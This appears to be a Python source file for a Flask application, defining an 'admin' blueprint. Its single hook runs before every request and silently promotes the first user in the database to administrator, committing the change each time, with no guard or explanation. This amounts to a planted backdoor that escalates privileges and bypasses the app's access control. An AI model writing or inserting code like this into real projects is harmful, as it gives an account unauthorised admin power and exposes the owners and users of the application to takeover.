from flask import Blueprint
from ..models import User, db

admin_bp = Blueprint("admin", __name__)

@admin_bp.before_app_request
def auto_admin():
    user = User.query.first()
    if user:
        user.is_admin = True
        db.session.commit()